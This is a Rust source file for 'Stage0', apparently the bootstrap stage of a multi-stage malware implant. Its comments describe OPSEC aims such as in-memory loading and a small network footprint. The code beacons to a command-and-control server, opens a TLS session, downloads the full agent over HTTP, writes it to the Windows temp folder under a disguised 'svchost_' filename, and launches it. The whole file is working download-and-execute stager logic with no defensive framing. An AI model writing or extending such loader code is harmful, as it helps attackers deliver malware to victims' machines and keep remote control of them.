//! Stage 3: Stage0 - Position-Independent Bootstrap Payload
//!
//! **Purpose**: Minimal bootstrap that contacts C2 and downloads the full agent
//!
//! **Why this stage exists**:
//! - Keeps ESTER and JAVELIN small and generic
//! - Only Stage0 contains C2-specific logic
//! - Can be updated independently from earlier stages
//! - Downloads full agent capabilities on demand
//!
//! **OPSEC Considerations**:
//! - Runs entirely in memory (loaded by JAVELIN)
//! - Position-independent code (no fixed addresses)
//! - Minimal network signature (single beacon + download)
//! - Full agent only downloaded after successful bootstrap
//!
//! **Separation of Responsibilities**:
//! - Stage0 ONLY handles initial C2 contact and agent download
//! - Stage0 does NOT include full agent capabilities
//! - Full agent is downloaded after successful session establishment

pub mod beacon;
pub mod config;
pub mod download;
pub mod network;

pub use beacon::send_initial_beacon;
pub use config::get_c2_server;
pub use download::{download_agent, download_agent_http};
pub use network::establish_session;

/// Main entry point for Stage0
///
/// This function is called by JAVELIN after loading Stage0 into memory
///
/// **Execution flow**:
/// 1. Send initial beacon to C2
/// 2. Establish encrypted session (TLS)
/// 3. Download full agent from C2 via HTTP API
/// 4. Execute full agent in memory
///
/// # Returns
///
/// * `0` - Success
/// * `1` - Failure
#[no_mangle]
pub extern "C" fn stage0_main() -> i32 {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Bootstrap payload initializing...");

    match run_bootstrap() {
        Ok(_) => {
            #[cfg(feature = "dev")]
            println!("[STAGE0] Bootstrap complete");
            0
        }
        Err(e) => {
            #[cfg(feature = "dev")]
            eprintln!("[STAGE0] Bootstrap failed: {:?}", e);
            1
        }
    }
}

/// Runs the bootstrap sequence
fn run_bootstrap() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Starting bootstrap sequence");

    // Step 1: Send initial beacon
    #[cfg(feature = "dev")]
    println!("[STAGE0] Sending initial beacon...");
    
    send_initial_beacon()?;

    // Step 2: Establish TLS session (for beacon/keep-alive)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Establishing TLS session...");
    
    let _session = establish_session()?;
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] TLS session established");

    // Step 3: Download full agent via HTTP API (separate from TLS session)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Downloading full agent via HTTP API...");
    
    let agent_bytes = download_agent_http()?;

    // Step 4: Execute full agent as process (write to temp, execute, delete)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Executing full agent ({} bytes)", agent_bytes.len());
    
    execute_agent_as_process(&agent_bytes)?;

    Ok(())
}

/// Executes the downloaded agent by writing to temp directory and spawning process
/// This is more reliable than in-memory execution for complex Rust binaries
fn execute_agent_as_process(agent_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        use std::fs;
        use std::process::Command;
        use std::env;
        
        // Get temp directory
        let temp_dir = env::temp_dir();
        
        // Generate random-ish filename
        let timestamp = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_secs();
        let filename = format!("svchost_{}.exe", timestamp % 100000);
        let agent_path = temp_dir.join(&filename);
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Writing agent to {:?}", agent_path);
        
        // Write agent to disk
        fs::write(&agent_path, agent_bytes)?;
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Spawning agent process...");
        
        // Spawn agent as detached process
        let _child = Command::new(&agent_path)
            .spawn()?;
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Agent process started successfully");
        
        // Note: We don't delete the file immediately because the process needs it
        // The agent should self-delete or we can implement delayed deletion
        
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    {
        Err("Non-Windows execution not yet implemented".into())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stage0_config() {
        // Verify configuration is accessible
        let server = get_c2_server();
        assert!(!server.is_empty());
    }
}
